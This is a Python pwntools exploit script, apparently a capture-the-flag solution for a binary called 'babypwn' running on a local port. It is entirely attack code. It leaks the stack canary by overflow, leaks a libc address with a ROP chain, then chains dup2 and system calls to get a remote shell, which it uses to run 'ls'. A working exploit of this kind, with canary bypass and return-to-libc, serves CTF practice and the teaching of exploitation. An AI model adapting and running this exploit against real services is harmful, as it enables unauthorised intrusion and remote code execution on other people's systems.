from pwn import *
import time
# leak canary
# leak libc address
# rop

#p = process('./babypwn')
e = ELF('./babypwn')
pr = 0x08048b85
ppr = 0x08048b84
pppr = 0x08048eed
time.sleep(0.5)

# leak canary
r = remote('127.0.0.1', 8181)
r.send('1\n')
time.sleep(0.5)
r.recv(1000)
r.send('A'*0x29)
time.sleep(0.5)
canary = '\x00'+r.recv(1000)[0x29:0x2c]
print hex(u32(canary))
r.close()


# leak libc address
r = remote('127.0.0.1', 8181)
r.send('1\n')
time.sleep(0.5)
r.recv(1000)
rop = ROP(e)
rop.call(0x080488b1, [e.got['recv']])
r.send('A'*0x28+canary+'A'*0xc+str(rop))
time.sleep(0.5)
r.recv(1000)
r.send('3\n')
time.sleep(0.5)
recv = u32(r.recv(1000)[0:4])
dup2 = recv-e.libc.symbols['recv']+e.libc.symbols['dup2']
system = recv-e.libc.symbols['recv']+e.libc.symbols['system']
bin_sh = recv-e.libc.symbols['recv']+0x0015b82b
print hex(dup2)
r.close()

# rop
r = remote('127.0.0.1', 8181)
r.send('1\n')
time.sleep(0.5)
r.recv(1000)

print hex(e.plt['system'])
r.send(flat(
    'A'*0x28, canary, 'A'*0xc,
    0x08048907, ppr, e.got['alarm'], 8,
    dup2, ppr, 4, 1,
    system, 0, e.got['alarm']
    ))
time.sleep(0.5)
r.recv(1000)
r.send('3\n')
time.sleep(0.5)
r.send('ls\x0a\x00\x00\x00\x00\x00')

print r.recvall()


